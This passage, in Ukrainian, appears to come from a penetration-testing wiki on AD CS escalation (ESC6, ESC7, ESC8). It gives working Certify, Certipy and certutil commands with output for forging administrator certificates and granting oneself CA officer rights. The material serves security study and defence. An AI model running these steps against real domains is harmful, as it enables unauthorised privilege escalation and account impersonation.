**–ü—Ä–∏–º—ñ—Ç–∫–∞**: –ü—ñ–¥—Ö—ñ–¥ –¥–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è **–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏—Ö —ñ–º–µ–Ω** –≤ –∑–∞–ø–∏—Ç –Ω–∞ –ø—ñ–¥–ø–∏—Å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ (CSR), —á–µ—Ä–µ–∑ –∞—Ä–≥—É–º–µ–Ω—Ç `-attrib "SAN:"` –≤ `certreq.exe` (–≤—ñ–¥–æ–º–∏–π —è–∫ "–ü–∞—Ä–∏ —ñ–º–µ–Ω –ó–Ω–∞—á–µ–Ω—å"), –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î **–∫–æ–Ω—Ç—Ä–∞—Å—Ç** –≤—ñ–¥ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó SANs –≤ ESC1. –¢—É—Ç –≤—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, **—è–∫ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —É–∫–ª–∞–¥–µ–Ω–∞**‚Äî–≤ –º–µ–∂–∞—Ö –∞—Ç—Ä–∏–±—É—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –∞ –Ω–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è. 

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–î–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó –º–æ–∂—É—Ç—å —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è –Ω–∞—Å—Ç—É–ø–Ω–æ—é –∫–æ–º–∞–Ω–¥–æ—é –∑ `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
–¶—è –æ–ø–µ—Ä–∞—Ü—ñ—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—î—Å—Ç—Ä—É**, –æ—Ç–∂–µ, –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–º –ø—ñ–¥—Ö–æ–¥–æ–º –º–æ–∂–µ –±—É—Ç–∏:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ [**Certify**](https://github.com/GhostPack/Certify) —Ç–∞ [**Certipy**](https://github.com/ly4k/Certipy), –º–æ–∂—É—Ç—å –≤–∏—è–≤–∏—Ç–∏ —Ü—é –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ó—ó:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
–î–ª—è –∑–º—ñ–Ω–∏ —Ü–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å, –ø—Ä–∏–ø—É—Å–∫–∞—é—á–∏, —â–æ —É –≤–∞—Å —î **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ñ** –ø—Ä–∞–≤–∞ –¥–æ–º–µ–Ω—É –∞–±–æ —ó–º –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω—ñ, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –∑ –±—É–¥—å-—è–∫–æ—ó —Ä–æ–±–æ—á–æ—ó —Å—Ç–∞–Ω—Ü—ñ—ó:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
–©–æ–± –≤–∏–º–∫–Ω—É—Ç–∏ —Ü—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —É –≤–∞—à–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, –ø—Ä–∞–ø–æ—Ä–µ—Ü—å –º–æ–∂–Ω–∞ –≤–∏–¥–∞–ª–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
–ü—ñ—Å–ª—è –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –≤ —Ç—Ä–∞–≤–Ω—ñ 2022 —Ä–æ–∫—É, –Ω–æ–≤—ñ –≤–∏–¥–∞–Ω—ñ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏** –±—É–¥—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏**, —è–∫–µ –≤–∫–ª—é—á–∞—î **–≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `objectSid` –∑–∞–ø–∏—Ç—É–≤–∞—á–∞**. –î–ª—è ESC1 —Ü–µ–π SID –ø–æ—Ö–æ–¥–∏—Ç—å –≤—ñ–¥ –≤–∫–∞–∑–∞–Ω–æ–≥–æ SAN. –û–¥–Ω–∞–∫ –¥–ª—è **ESC6** SID –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î **`objectSid` –∑–∞–ø–∏—Ç—É–≤–∞—á–∞**, –∞ –Ω–µ SAN.\
–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è ESC6 –≤–∞–∂–ª–∏–≤–æ, —â–æ–± —Å–∏—Å—Ç–µ–º–∞ –±—É–ª–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ ESC10 (–°–ª–∞–±–∫—ñ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤), —è–∫–∞ –Ω–∞–¥–∞—î –ø–µ—Ä–µ–≤–∞–≥—É **SAN –Ω–∞–¥ –Ω–æ–≤–∏–º —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º –±–µ–∑–ø–µ–∫–∏**.
{% endhint %}

## –í—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∞–≤—Ç–æ—Ä–∏—Ç–µ—Ç—É - ESC7

### –ê—Ç–∞–∫–∞ 1

#### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–ö–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∞–≤—Ç–æ—Ä–∏—Ç–µ—Ç—É –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞–±–æ—Ä—É –¥–æ–∑–≤–æ–ª—ñ–≤, —è–∫—ñ —Ä–µ–≥—É–ª—é—é—Ç—å –¥—ñ—ó CA. –¶—ñ –¥–æ–∑–≤–æ–ª–∏ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ `certsrv.msc`, –∫–ª–∞—Ü–Ω—É–≤—à–∏ –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ –Ω–∞ CA, –≤–∏–±—Ä–∞–≤—à–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–π—à–æ–≤—à–∏ –Ω–∞ –≤–∫–ª–∞–¥–∫—É –ë–µ–∑–ø–µ–∫–∞. –ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–æ–∑–≤–æ–ª–∏ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–¥—É–ª—è PSPKI –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥, —Ç–∞–∫–∏—Ö —è–∫:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
–¶–µ –Ω–∞–¥–∞—î –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ –æ—Å–Ω–æ–≤–Ω—ñ –ø—Ä–∞–≤–∞, –∞ —Å–∞–º–µ **`ManageCA`** —Ç–∞ **`ManageCertificates`**, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ä–æ–ª—è–º "–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ CA" —Ç–∞ "–ú–µ–Ω–µ–¥–∂–µ—Ä–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤" –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ.

#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ú–∞—é—á–∏ –ø—Ä–∞–≤–∞ **`ManageCA`** –Ω–∞ —Ü–µ–Ω—Ç—Ä —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª –º–æ–∂–µ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PSPKI. –¶–µ –≤–∫–ª—é—á–∞—î –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è –ø—Ä–∞–ø–æ—Ä—Ü—è **`EDITF_ATTRIBUTESUBJECTALTNAME2`** –¥–ª—è –¥–æ–∑–≤–æ–ª—É –≤–∫–∞–∑–∞–Ω–Ω—è SAN –≤ –±—É–¥—å-—è–∫–æ–º—É —à–∞–±–ª–æ–Ω—ñ, —â–æ —î –∫—Ä–∏—Ç–∏—á–Ω–∏–º –∞—Å–ø–µ–∫—Ç–æ–º –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—É.

–°–ø—Ä–æ—â–µ–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –º–æ–∂–ª–∏–≤–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–ª–µ—Ç—É **Enable-PolicyModuleFlag** —É PSPKI, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–Ω–µ—Å–µ–Ω–Ω—è –∑–º—ñ–Ω –±–µ–∑ –ø—Ä—è–º–æ—ó –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ GUI.

–í–æ–ª–æ–¥—ñ–Ω–Ω—è –ø—Ä–∞–≤–∞–º–∏ **`ManageCertificates`** —Å–ø—Ä–∏—è—î —Å—Ö–≤–∞–ª–µ–Ω–Ω—é –æ—á—ñ–∫—É—é—á–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –æ–±—Ö–æ–¥—è—á–∏ –∑–∞—Ö–∏—Å—Ç "–°—Ö–≤–∞–ª–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ CA".

–ö–æ–º–±—ñ–Ω–∞—Ü—ñ—é –º–æ–¥—É–ª—ñ–≤ **Certify** —Ç–∞ **PSPKI** –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∑–∞–ø–∏—Ç—É, —Å—Ö–≤–∞–ª–µ–Ω–Ω—è —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### –ê—Ç–∞–∫–∞ 2

#### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

{% hint style="warning" %}
–£ **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∞—Ç–∞–∫—ñ** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏—Å—è –¥–æ–∑–≤–æ–ª–∏ **`Manage CA`** –¥–ª—è **—É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è** –ø—Ä–∞–ø–æ—Ä—Ü—è **EDITF\_ATTRIBUTESUBJECTALTNAME2** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ **ESC6**, –∞–ª–µ —Ü–µ –Ω–µ –º–∞—Ç–∏–º–µ –∂–æ–¥–Ω–æ–≥–æ –µ—Ñ–µ–∫—Ç—É, –ø–æ–∫–∏ —Å–ª—É–∂–±—É CA (`CertSvc`) –Ω–µ –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω–æ. –ö–æ–ª–∏ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —î –ø—Ä–∞–≤–æ –¥–æ—Å—Ç—É–ø—É `Manage CA`, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ç–∞–∫–æ–∂ –º–æ–∂–µ **–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–ª—É–∂–±—É**. –û–¥–Ω–∞–∫ —Ü–µ **–Ω–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–ª—É–∂–±—É –≤—ñ–¥–¥–∞–ª–µ–Ω–æ**. –ö—Ä—ñ–º —Ç–æ–≥–æ, **ESC6 –º–æ–∂–µ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑—Ä–∞–∑—É** —É –±—ñ–ª—å—à–æ—Å—Ç—ñ –æ–Ω–æ–≤–ª–µ–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â —á–µ—Ä–µ–∑ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –≤ —Ç—Ä–∞–≤–Ω—ñ 2022 —Ä–æ–∫—É.
{% endhint %}

–û—Ç–∂–µ, —Ç—É—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ —ñ–Ω—à–∞ –∞—Ç–∞–∫–∞.

–ü–µ—Ä–µ–¥—É–º–æ–≤–∏:

* –¢—ñ–ª—å–∫–∏ –¥–æ–∑–≤—ñ–ª **`ManageCA`**
* –î–æ–∑–≤—ñ–ª **`Manage Certificates`** (–º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–¥–∞–Ω–∏–π –∑ **`ManageCA`**)
* –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ **`SubCA`** –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ **—É–≤—ñ–º–∫–Ω–µ–Ω–∏–π** (–º–æ–∂–µ –±—É—Ç–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–π –∑ **`ManageCA`**)

–¢–µ—Ö–Ω—ñ–∫–∞ “ë—Ä—É–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ —Ç–æ–º—É, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –ø—Ä–∞–≤–æ–º –¥–æ—Å—Ç—É–ø—É `Manage CA` _—ñ_ `Manage Certificates` –º–æ–∂—É—Ç—å **–≤–∏–¥–∞–≤–∞—Ç–∏ –Ω–µ–≤–¥–∞–ª—ñ –∑–∞–ø–∏—Ç–∏ –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏**. –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ **`SubCA`** **—É—Ä–∞–∑–ª–∏–≤–∏–π –Ω–∞ ESC1**, –∞–ª–µ **—Ç—ñ–ª—å–∫–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏** –º–æ–∂—É—Ç—å –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è –≤ —à–∞–±–ª–æ–Ω—ñ. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á** –º–æ–∂–µ **–∑–∞–ø—Ä–æ—Å–∏—Ç–∏** –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è –≤ **`SubCA`** - —â–æ –±—É–¥–µ **–≤—ñ–¥—Ö–∏–ª–µ–Ω–æ** - –∞–ª–µ **–ø–æ—Ç—ñ–º –≤–∏–¥–∞–Ω–æ –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º –ø—ñ–∑–Ω—ñ—à–µ**.

#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–¥–∞—Ç–∏ —Å–æ–±—ñ –¥–æ—Å—Ç—É–ø –¥–æ `Manage Certificates`**, –¥–æ–¥–∞–≤—à–∏ —Å–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —è–∫ –Ω–æ–≤–æ–≥–æ –ø–æ—Å–∞–¥–æ–≤—Ü—è.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
–®–∞–±–ª–æ–Ω **`SubCA`** –º–æ–∂–Ω–∞ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –Ω–∞ CA** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-enable-template`. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —à–∞–±–ª–æ–Ω `SubCA` —É–≤—ñ–º–∫–Ω–µ–Ω–æ.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
–Ø–∫—â–æ –º–∏ –≤–∏–∫–æ–Ω–∞–ª–∏ –ø–µ—Ä–µ–¥—É–º–æ–≤–∏ –¥–ª—è —Ü—å–æ–≥–æ –Ω–∞–ø–∞–¥—É, –º–∏ –º–æ–∂–µ–º–æ –ø–æ—á–∞—Ç–∏, **–∑–∞–ø–∏—Ç–∞–≤—à–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ —à–∞–±–ª–æ–Ω—É `SubCA`**.

**–¶–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –≤—ñ–¥—Ö–∏–ª–µ–Ω–∏–π**, –∞–ª–µ –º–∏ –∑–±–µ—Ä–µ–∂–µ–º–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á —Ç–∞ –∑–∞—Ñ—ñ–∫—Å—É—î–º–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∑–∞–ø–∏—Ç—É.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
–ó –Ω–∞—à–∏–º–∏ **`–ö–µ—Ä—É–≤–∞–Ω–Ω—è CA` —Ç–∞ `–ö–µ—Ä—É–≤–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞–º–∏`**, –º–∏ –º–æ–∂–µ–º–æ **–≤–∏–¥–∞—Ç–∏ –Ω–µ—É—Å–ø—ñ—à–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `ca` —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
–Ü, –Ω–∞—Ä–µ—à—Ç—ñ, –º–∏ –º–æ–∂–µ–º–æ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏–¥–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `req` —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay –Ω–∞ HTTP-—Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É AD CS - ESC8

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

{% hint style="info" %}
–£ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö, –¥–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ **AD CS**, —è–∫—â–æ —ñ—Å–Ω—É—î **—É—Ä–∞–∑–ª–∏–≤–∞ –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ –≤–µ–±-—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó** —Ç–∞ —â–æ–Ω–∞–π–º–µ–Ω—à–µ –æ–¥–∏–Ω **—à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–∏–π**, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î **—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –¥–æ–º–µ–Ω–Ω–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ —Ç–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∫–ª—ñ—î–Ω—Ç–∞** (—Ç–∞–∫–∏–π —è–∫ —Ç–∏–ø–æ–≤–∏–π **`Machine`** —à–∞–±–ª–æ–Ω), —Å—Ç–∞—î –º–æ–∂–ª–∏–≤–∏–º **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–Ω–Ω—è –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –∑ –∞–∫—Ç–∏–≤–Ω–∏–º —Å–ª—É–∂–±–æ—é —Å–ø—É–ª–µ—Ä–∞ –∞—Ç–∞–∫—É—é—á–∏–º**!
{% endhint %}

–î–µ–∫—ñ–ª—å–∫–∞ **–º–µ—Ç–æ–¥—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ HTTP** –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å—Å—è AD CS, –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —Ä–æ–ª—ñ —Å–µ—Ä–≤–µ—Ä–∞, —è–∫—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏. –¶—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ HTTP –ø—ñ–¥–¥–∞—é—Ç—å—Å—è **–∞—Ç–∞–∫–∞–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è NTLM**. –ê—Ç–∞–∫—É—é—á–∏–π, –∑ **–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞, –º–æ–∂–µ –≤–∏–¥–∞–∞–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å AD, —è–∫–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –≤—Ö—ñ–¥–Ω–∏–π NTLM**. –ü—ñ–¥ —á–∞—Å –≤–∏–¥–∞—á—ñ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∂–µ—Ä—Ç–≤–∏, —Ü—ñ –≤–µ–±-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –∞—Ç–∞–∫—É—é—á–æ–º—É –¥–ª—è **–∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ `User` –∞–±–æ `Machine`**.

